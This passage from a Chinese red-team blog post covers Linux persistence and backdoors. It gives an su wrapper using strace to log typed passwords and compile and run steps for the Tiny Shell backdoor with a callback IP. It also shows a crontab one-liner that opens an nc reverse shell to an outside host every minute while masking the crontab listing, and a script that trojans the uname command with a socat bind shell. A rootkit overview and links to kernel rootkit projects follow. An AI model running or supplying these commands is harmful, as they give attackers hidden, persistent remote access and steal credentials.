+<p>docker测试的时候加 –privileged参数</p>
+<p>同理可以记录其他命令</p>
+<pre><code>su=&#39;strace   -o   /tmp/sulog-`date    &#39;+%d%h%m%s&#39;`.log  \
+ -e read,write,connect  -s2048 su&#39;</code></pre><h2 id="Tiny-shell"><a href="#Tiny-shell" class="headerlink" title="Tiny shell"></a>Tiny shell</h2><p>项目地址:<a href="https://github.com/orangetw/tsh" target="_blank" rel="noopener">https://github.com/orangetw/tsh</a></p>
+<p>在linux下编译</p>
+<pre><code>./compile.sh linux 149.129.72.186 1234 wing 22</code></pre><p>参数代表的意思如下</p>
+<pre><code>usage:
+compile.sh os BC_HOST BC_PORT [PASSWORD] [BC_DELAY]
+compile.sh os 8.8.8.8 8081
+compile.sh os 8.8.8.8 8081 mypassword 60
+
+
+Please specify one of these targets:
+
+    compile.sh linux
+    compile.sh freebsd
+    compile.sh openbsd
+    compile.sh netbsd
+    compile.sh cygwin
+    compile.sh sunos
+    compile.sh irix
+    compile.sh hpux
+    compile.sh osf</code></pre><p>成功以后会生成tsh和tshd文件<br>分别表示控制端和服务端<br>在目标上运行</p>
+<pre><code>umask 077; HOME=/var/tmp ./tshd</code></pre><p>在攻击机器上运行</p>
+<pre><code>tsh targetip</code></pre><p>可以得到一个shell.<br>除此之外,还可以上传和下载文件.</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODUzOTczMzIzNzQuanBn?x-oss-process=image/format,png" alt="-w672"></p>
+<p><strong>-w672</strong></p>
+<p>反弹的形式</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODUzOTcxNTI5NDguanBn?x-oss-process=image/format,png" alt="-w585"></p>
+<p><strong>-w585</strong></p>
+<h2 id="浏览器插件后门"><a href="#浏览器插件后门" class="headerlink" title="浏览器插件后门"></a>浏览器插件后门</h2><p>项目地址:<a href="https://github.com/graniet/chromebackdoor" target="_blank" rel="noopener">https://github.com/graniet/chromebackdoor</a></p>
+<p>我花了很多时间来测试这个项目,目前还没成功,不知道是不是浏览器有限制.</p>
+<h2 id="Local-Job-Scheduling"><a href="#Local-Job-Scheduling" class="headerlink" title="Local Job Scheduling"></a>Local Job Scheduling</h2><h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><p>测试环境:mac<br>定时反弹shell</p>
+<pre><code>(crontab -l;printf &quot;*/1 * * * * /usr/bin/nc 30.157.170.75 1389 /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODY5OTU5Mzk1MTkuanBn?x-oss-process=image/format,png" alt="-w1554"></p>
+<p><strong>-w1554</strong></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODY5OTU4MjE5NzguanBn?x-oss-process=image/format,png" alt="-w780"></p>
+<p><strong>-w780</strong></p>
+<h2 id="other-backdoor"><a href="#other-backdoor" class="headerlink" title="other backdoor"></a>other backdoor</h2><p>项目地址:<a href="https://github.com/iamckn/backdoors" target="_blank" rel="noopener">https://github.com/iamckn/backdoors</a><br>一些进程隐藏技术,然后反弹shell.</p>
+<p>用uname做一个演示</p>
+<p>uname.sh</p>
+<pre><code>#uname
+#-------------------------
+touch /usr/local/bin/uname
+
+cat &lt;&lt;EOF &gt;&gt; /usr/local/bin/uname
+#!/bin/bash
+#nc.traditional -l -v -p 4444 -e /bin/bash 2&gt;/dev/null &amp;
+#socat TCP4-Listen:3177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;
+socat SCTP-Listen:1177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;
+#perl -MIO -e&#39;$s=new IO::Socket::INET(LocalPort=&gt;1337,Listen=&gt;1);while($c=$s-&gt;accept()){$_=&lt;$c&gt;;print $c `$_`;}&#39; 2&gt;/dev/null &amp;
+/bin/uname \$@
+EOF</code></pre><p>里面的反弹shell命令自己替换</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODc5MTU4OTg1MTEuanBn?x-oss-process=image/format,png" alt="-w1102"></p>
+<p><strong>-w1102</strong></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODc5MTU5ODE4NjEuanBn?x-oss-process=image/format,png" alt="-w1102"></p>
+<p><strong>-w1102</strong></p>
+<h2 id="0x03-Rookit"><a href="#0x03-Rookit" class="headerlink" title="0x03 Rookit"></a>0x03 Rookit</h2><h3 id="Rookit是什么"><a href="#Rookit是什么" class="headerlink" title="Rookit是什么"></a>Rookit是什么</h3><p>在悬念迭起的中外谍战片里，对战双方中的一派势力通常会派遣特工人员潜伏到对手阵营中。这名卧底人员良好的伪装使得对手对此长时间毫无察觉；为了能够长期潜伏他不贸然采取高风险行为以免过早暴露自己；他赢得敌人的信任并因此身居要职，这使得他能够源源不断地获取重要情报并利用其独特渠道传送回去。</p>
+<p>从某种意义上说这位不速之客就是Rootkit——持久并毫无察觉地驻留在目标计算机中，对系统进行操纵、并通过隐秘渠道收集数据的程序。Rootkit的三要素就是：隐藏、操纵、收集数据。</p>
+<p>“Rootkit”中root术语来自于unix领域。由于unix主机系统管理员账号为root账号，该账号拥有最小的安全限制，完全控制主机并拥有了管理员权限被称为“root”了这台电脑。然而能够“root”一台主机并不意味着能持续地控制它，因为管理员完全可能发现了主机遭受入侵并采取清理措施。因此Rootkit的初始含义就在于“能维持root权限的一套工具”。</p>
+<p>简单地说，Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。</p>
+<p>一个典型rootkit包括：</p>
+<ul>
+<li><p>1 以太网嗅探器程序，用于获得网络上传输的用户名和密码等信息。</p>
+</li>
+<li><p>2 特洛伊木马程序，例如：inetd或者login，为攻击者提供后门。</p>
+</li>
+<li><p>3 隐藏攻击者的目录和进程的程序，例如：ps、netstat、rshd和ls等。</p>
+</li>
+<li><p>4 可能还包括一些日志清理工具，例如：zap、zap2或者z2，攻击者使用这些清理工具删除wtmp、utmp和lastlog等日志文件中有关自己行踪的条目。</p>
+</li>
+<li><p>一些复杂的rootkit还可以向攻击者提供telnet、shell和finger等服务。</p>
+</li>
+</ul>
+<h3 id="应用级rootkit"><a href="#应用级rootkit" class="headerlink" title="应用级rootkit"></a>应用级rootkit</h3><p>应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。<br>应用级的比较容易清掉,最麻烦的是内核级和硬件级的.</p>
+<p>###内核级rookit<br>通过加载内核模块的方式来加载后门，比较复杂。一般内核后门都是针对操作系统而言的，不同的操作系统内核模块设置编写方法都不一样，一般不通用。内核后门一般无法通过md5校验等来判断，所有基本比较难发现，目前针对内核后门比较多的是Linux和Solaris下。</p>
+<h3 id="硬件级后门"><a href="#硬件级后门" class="headerlink" title="硬件级后门"></a>硬件级后门</h3><p>这个就是厂商的板子里面就有后门,比如cpu处理器,主板,鼠标,等等.</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxMDk5MjU1NzAuanBn?x-oss-process=image/format,png" alt="-w953"></p>
+<p><strong>-w953</strong></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxMTAxMTAyNTIuanBn?x-oss-process=image/format,png" alt="-w953"></p>
+<p><strong>-w953</strong></p>
+<p>demo:我找的这个是应该是内核rookit的例子,其他经典内核的可以看下这两个:</p>
+<p><a href="https://github.com/David-Reguera-Garcia-Dreg/enyelkm" target="_blank" rel="noopener">https://github.com/David-Reguera-Garcia-Dreg/enyelkm</a><br><a href="https://github.com/yaoyumeng/adore-ng" target="_blank" rel="noopener">https://github.com/yaoyumeng/adore-ng</a></p>
+<h3 id="Reptile"><a href="#Reptile" class="headerlink" title="Reptile"></a>Reptile</h3><p>测试环境:kali</p>
+<p>项目地址:<a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">https://github.com/f0rb1dd3n/Reptile</a></p>
+<p>安装:</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxMTgyNjUxNTIuanBn?x-oss-process=image/format,png" alt="-w961"></p>
+<p><strong>-w961</strong></p>
+<p>emmmm<br>环境炸了.kali得重装<br>使用教程参考如下<br><a href="https://www.notion.so/redteamwing/Reptile-LKM-Linux-rootkit-153c8daa25244ce69461d1515375e8cc" target="_blank" rel="noopener">https://www.notion.so/redteamwing/Reptile-LKM-Linux-rootkit-153c8daa25244ce69461d1515375e8cc</a></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxNzA5MjQ5NzguanBn?x-oss-process=image/format,png" alt></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://youngscript.github.io" rel="external nofollow noreferrer">Young</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://youngscript.github.io/2020/073020432.html">http://youngscript.github.io/2020/073020432.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="http://youngscript.github.io" target="_blank">Young</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'D2HwQ9CtRcq9x963YH02Fgpf-gzGzoHsz',
+        appKey: 'b3TSPFBekUvo5D0wIle2tnfX',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/073026401.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="内网入口">
+                        
+                        <span class="card-title">内网入口</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            说明以下仅针对日常 &quot;红队&quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总
+针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)
+由于红队不
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-30
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BA%A2%E9%98%9F/" class="post-category">
+                                    红队
+                                </a>
+                            
+                            <a href="/categories/%E7%BA%A2%E9%98%9F/%E5%86%85%E7%BD%91/" class="post-category">
+                                    内网
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/041151042.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="php中的数组">
+                        
+                        <span class="card-title">php中的数组</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            0x01.数组的定义与类型如何定义数组？一般都是使用 array() 函数定义的数组
+&lt;?php
+$arr = array('jsp','asp','php');
+print_r($arr);
+?>
+数组的两种类型数组类型分1.索引数
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/php/" class="post-category">
+                                    php
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Young&#39;s Blogs<br />'
+            + '文章作者: Young<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="http://youngscript.github.io" target="_blank">Young</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">36.5k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
